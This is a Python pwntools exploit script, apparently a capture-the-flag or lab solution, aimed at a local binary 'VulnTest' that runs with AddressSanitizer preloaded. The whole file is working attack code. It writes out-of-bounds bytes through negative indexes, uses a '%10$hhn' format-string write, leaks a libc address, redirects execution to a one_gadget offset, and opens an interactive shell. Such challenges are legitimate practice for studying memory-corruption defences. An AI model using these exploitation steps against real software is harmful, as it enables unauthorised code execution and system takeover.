from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'critical'

elf = ELF('./VulnTest')

local = True
#local = False

def exploit():
    with process(elf.path, env={"LD_PRELOAD":"./libasan.so.4"}) as p:
    #  with remote("127.0.0.1", 9999) as p:
        # p = remote('127.0.0.1', 1337)

        # raw_input()
        # Test 2
        p.recvuntil('>> ')
        p.sendline('2')

        #for i in xrange(8):
        #    p.recvuntil('>> ')
        #    p.sendline('1')
        #    p.recvuntil(':')
        #    p.sendline(str(-64+i))
        #    p.recvuntil('overflow!')
        #    p.send('\n')

        p.recvuntil('>> ')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline('-64')
        p.recvuntil('overflow!')
        p.send('\xfe' * 13 + '\0')

        p.recvuntil('>> ')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline('-136')
        p.recvuntil('overflow!')
        p.send('\x80' + '\0')

        p.recvuntil('>> ')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline('-152')
        p.recvuntil('overflow!')
        p.send('\xe6' + '\0')
        # p.send('AAAA' + '\0')

        p.recvuntil('>> ')
        p.sendline('1')
        p.recvuntil(':')
        p.send('%10$hhn')
        p.recvuntil('>> ')
        p.sendline('2')

        p.recvuntil('!\n')
        p.recv(32)
        libc = u64(p.recv(8)) - 0x3eb780
        magic = libc + 0x4f322
        #  print hex(libc)

        p.recvuntil('>> ')
        p.sendline('2')

        p.recvuntil('>> ')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline('-152')
        p.recvuntil('overflow!')
        p.send(p64(magic).replace('\0', '') + '\0')


        p.sendline("cd /home/wang/success")
        p.interactive()

exploit()
